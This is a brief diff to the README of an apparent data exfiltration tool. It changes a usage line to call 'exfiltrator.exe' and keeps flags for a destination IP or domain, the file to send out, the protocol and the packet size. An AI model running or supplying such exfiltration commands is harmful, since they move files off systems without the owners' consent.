@@ -60,7 +60,7 @@ pip install -r requirements.txt
 # "-f", "--file": Used to specify the file that will be exfiltrated
 # "-i", "--protocol": Used to specify the protocol used during exfiltration
 # "-s", "--size": Used to specify the size of each packet to be sent
-./exfiltrator -d "<IP or Domain Name>" -f "<filename>" -i "protocol" -s <size>
+./exfiltrator.exe -d "<IP or Domain Name>" -f "<filename>" -i "protocol" -s <size>
 python3 exfiltrator.py -d "<IP or Domain Name>" -f "<filename>" -i "protocol" -s <size>
 ```
 
